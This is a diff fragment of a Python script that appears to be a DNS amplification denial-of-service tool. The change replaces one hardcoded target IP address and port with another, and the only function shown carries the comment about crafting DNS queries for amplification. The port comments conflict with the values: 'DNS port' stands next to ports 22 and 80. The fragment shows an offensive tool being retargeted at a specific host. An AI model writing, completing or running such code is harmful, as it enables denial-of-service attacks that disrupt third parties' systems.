@@ -2,8 +2,8 @@ import socket
 import random
 import struct
 
-target = "207.180.234.134"  # Target IP address
-port = 22  # DNS port
+target = "78.157.42.100"  # Target IP address
+port = 80  # DNS port
 
 def generate_dns_query():
     # Craft a DNS query for amplification
